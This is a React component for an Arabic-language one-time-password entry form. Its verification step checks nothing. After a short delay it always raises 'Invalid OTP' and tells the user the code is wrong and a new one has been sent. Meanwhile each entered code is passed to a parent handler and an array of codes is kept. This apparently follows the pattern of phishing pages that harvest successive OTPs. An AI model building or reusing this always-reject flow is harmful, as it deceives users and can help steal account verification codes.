import { useState, FormEvent } from 'react';
import { Input } from './ui/input';
import { Button } from './ui/button';

interface Props {
  handleSubmit: any;
  setStep: (step: number) => void;
  stepr: number;
  show: boolean;
  otpArr:string[],
  handleOtp:any,
  otp:string
}

const OtpForm: React.FC<Props> = ({ handleSubmit, setStep, stepr, show ,otpArr,handleOtp,otp}) => {
  const [isloading, setIsloading] = useState(false);

  const handleOtpa = (value: string) => {
    handleOtp(value)
  }

  const handleOtpSubmit = async () => {
    setIsloading(true)
    try {
      // Here you would typically make an API call to verify the OTP
      // For now, we'll simulate a verification process
      await new Promise(resolve => setTimeout(resolve, 2000))
      
      // Simulating a failed verification
      throw new Error("Invalid OTP")
    } catch (error) {
      alert("رمز التحقق خاطئ. تم إرسال رمز جديد.")
    } finally {
      setIsloading(false)
    }
  }

  const handdleadd = async (e: FormEvent) => {
    e.preventDefault()
    
    if (stepr >= 5) {
      await handleOtpSubmit()
    } else {
      await handleSubmit(e)
      setStep(5)
    }
  }

  return (
    <form onSubmit={handdleadd}>
      {stepr >= 5 && (
        <>
          <Input
            onChange={(e) => handleOtpa(e.target.value)}
            value={otp}
            type="tel"
            placeholder="رمز التحقق"
            className="max-w-md text-sm sm:text-base"
            maxLength={6}
          />
          <Button
            disabled={(stepr === 4 && !show) || isloading}
            type="submit"
            className="w-full sm:min-w-[100px] py-4 bg-[#C8102E] hover:bg-[#C8102E]/90"
          >
            {stepr >= 5 ? (isloading ? 'جاري التحقق...' : 'تحقق') : 'تابع'}
          </Button>
        </>
      )}
    </form>
  );
};

export default OtpForm;
